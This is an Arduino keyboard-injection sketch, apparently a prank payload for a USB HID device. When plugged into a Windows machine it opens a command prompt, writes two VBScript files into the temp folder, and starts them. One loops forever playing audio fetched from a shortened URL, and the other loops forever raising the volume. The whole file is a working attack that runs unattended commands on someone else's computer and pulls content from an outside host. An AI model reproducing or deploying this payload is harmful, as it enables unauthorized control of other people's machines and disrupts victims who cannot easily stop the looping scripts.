#include <Keyboard.h> 
/*
 * Developer @root_haxor !
 */

// Init function
void setup()
{
  // Begining the stream
  Keyboard.begin();

  // Waiting 500ms for init
  delay(500);

  delay(3500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("del %tmp%\\rickyou.vbs");

  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("del %tmp%\\volup.vbs");

  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("cd %tmp% && copy con rickyou.vbs");

  typeKey(KEY_RETURN);

  Keyboard.print("While true");

  typeKey(KEY_RETURN);

  Keyboard.print("Dim oPlayer");

  typeKey(KEY_RETURN);

  Keyboard.print("Set oPlayer = CreateObject(\"WMPlayer.OCX\")");

  typeKey(KEY_RETURN);

  Keyboard.print("oPlayer.URL = \"http://tinyurl.com/s63ve48\"");

  typeKey(KEY_RETURN);

  Keyboard.print("oPlayer.controls.play");

  typeKey(KEY_RETURN);

  Keyboard.print("While oPlayer.playState <> 1 ' 1 = Stopped");

  typeKey(KEY_RETURN);

  Keyboard.print("WScript.Sleep 100");

  typeKey(KEY_RETURN);

  Keyboard.print("Wend");

  typeKey(KEY_RETURN);

  Keyboard.print("oPlayer.close");

  typeKey(KEY_RETURN);

  Keyboard.print("Wend");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(122);
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  Keyboard.print("copy con volup.vbs");

  typeKey(KEY_RETURN);

  Keyboard.print("do");

  typeKey(KEY_RETURN);

  Keyboard.print("Set WshShell = CreateObject(\"WScript.Shell\")");

  typeKey(KEY_RETURN);

  Keyboard.print("WshShell.SendKeys(chr(&hAF))");

  typeKey(KEY_RETURN);

  Keyboard.print("loop");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(122);
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  Keyboard.print("start rickyou.vbs && volup.vbs");

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {}
